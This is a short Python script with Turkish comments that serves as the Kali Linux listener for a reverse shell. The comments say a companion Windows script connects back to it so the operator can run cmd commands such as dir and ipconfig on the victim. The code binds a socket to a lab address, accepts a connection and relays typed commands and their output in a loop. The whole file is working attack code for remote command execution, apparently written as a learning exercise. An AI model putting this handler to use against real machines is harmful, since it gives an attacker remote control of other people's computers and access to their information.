import socket


# bu dosya kali linuxda çalışacak ve ilk bu dosya çalışacaktır. 
# daha sonra My-Socket-For-windows dosyası windows üzerinde çalışacaktır.
# ve artık cmd komutları ıle windows uzerındekı bilgileri edinebiliriz. dir ipconfig gibi komutları kullanarak


my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
my_listener.bind(("10.0.2.4",3333))
my_listener.listen(0)                   # connection limit = 0
print("listening......")
(my_connection, my_adress)=my_listener.accept()
print("Connection OK for Kali from : "+str(my_adress))

while True:
    command_input = raw_input("Enter command : ")
    my_connection.send(command_input)
    command_output = my_connection.recv(1024)
    print(command_output)

